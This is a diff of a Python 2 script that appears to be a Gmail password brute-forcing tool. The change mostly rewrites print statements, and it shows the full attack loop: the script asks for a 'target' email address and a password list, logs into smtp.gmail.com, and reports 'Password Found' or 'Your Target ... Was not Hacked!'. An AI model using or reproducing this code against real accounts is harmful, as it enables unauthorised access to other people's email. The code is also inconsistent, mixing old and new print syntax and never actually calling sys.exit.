@@ -32,32 +32,32 @@ os.system("clear")
 
 print rpfp + bcolors.BOLD + '{ '+tick+'} ping (www.gmail.com)' + bcolors.OKBLUE +  ' ' # Pinging gmail alert
 time.sleep(0.25)
-print ' '
+print ("")
 print rpfp + '{ '+tick+'/ '+untick+'} Checking Gmail availability started'  #checking availability notification
-print ' '
+print ("")
 os.system("ping www.gmail.com -c 3")  #pinging gmail command 
-print ' '
+print ("")
 print rpfp + '{ '+tick+'} Gmail is now available to work !' #gmail availability alert
-print ' '
+print ("")
 print rpfp + '{ '+tick+'} Connecting To The Server ! ' + bcolors.ENDC + ' '
-print ' '
+print ("")
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)  #Defining the smtp server
 smtpserver.ehlo()
 smtpserver.starttls() #connecting to the server
 print rpfp + '{ '+tick+'} Connected !' + bcolors.ENDC + ' '
-print ' '
+print ("")
 user = raw_input( rpfp + "{ "+tick+"} Enter the Target's Email Address ==>  ") #selecting target
-print ' '
+print ("")
 print rpfp + bcolors.FAIL + "("+user +")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Target's email succesfully selected ! ==> " + user + bcolors.ENDC + ' '     # target selected alert
-print '   '                      
+print ("")                      
 passwfile = raw_input( rpfp + bcolors.FAIL + "("+user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Enter the password list file name ==>  ") #selecting password file
-print ' '
+print ("")
 print rpfp + bcolors.FAIL + "("+ user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Password File Succesfully Selected ! ==> " + passwfile + bcolors.ENDC + ' ' #passwordfile selected alert
-print " "
+print ("")
 time.sleep(0.25)
 passwfile = open(passwfile, "r")
 print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Attack Status: Started Now !!! " + bcolors.ENDC + ' '  #bruteforce attack started alert
-print ' '
+print ("")
 logfile.write (user) #open the logfile and write the user selected (target)
 logfile.close() #close the logfile
 time.sleep(0.25)
@@ -65,7 +65,6 @@ time.sleep(0.25)
 for password in passwfile:  #search for the passwords in the password file
         try:
                 smtpserver.login(user, password) #try the username and the passwords in the passwfile 
- 
                 print " [✔] Password Found ==>  : %s" % password   #password found alert
                 break;
         except smtplib.SMTPAuthenticationError: #error log
@@ -73,24 +72,24 @@ for password in passwfile:  #search for the passwords in the password file
                                                                                                                                                                          
 print rpfp + bcolors.FAIL + "(" + user + ")"  +  " >" + bcolors.ENDC + ' ' + "{ "+tick+"} Scanning Status: complete !" + bcolors.ENDC + ' '    #scan finished alert
 time.sleep(0.25)
-print ' '
+print ("")
 print rpfp + bcolors.FAIL + "(" + user  + ")" + " > " + bcolors.ENDC +  "{ "+untick+"} All The Passwords for " + "(" + user + ") " +  'Are Checked But No One Works ¯\_(ツ)_/¯ ' 
-print '  '
+print ("")
 print rpfp + bcolors.FAIL + "(" + user + ")" +  " >" + bcolors.ENDC + " { "+untick+"} Real Password for " + user + " Not Found !  " + bcolors.ENDC + ' ' #password not found alert
-print '   '
+print ("")
 print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+tick+"} Try To Change The Keywords And Generate A New More Powerful Password List ¯\_(ツ)_/¯ " + bcolors.ENDC + ' '
-print ' '
+print ("")
 print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+untick+'} Your Target ' + "( " + user + " )" + ' Was not Hacked!' + bcolors.ENDC + ' '   #target not hacked alert
 time.sleep(0.5)
-print '   '
+print ("")
 print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' { '+tick+'} Time elapsed: ' + str(time.time() - start_time) + bcolors.ENDC + ' '   #time elapsed in tool
 time.sleep(0.25)
-print '  '
+print ("")
 print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' { '+tick+'} Good Luck Next Time ! ' + bcolors.ENDC + ' '
-print ' '
+print ("")
 print rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC +  ' { '+untick+'} Exiting Now !' + bcolors.ENDC + ' ' #exiting alert
-print ' '
+print ("")
 print rpfp + "[ "+ untick+"] Exit !" + bcolors.ENDC # exit alert
-print ' '
-print ' '
+print ("")
+print ("")
 sys.exit #exiting command
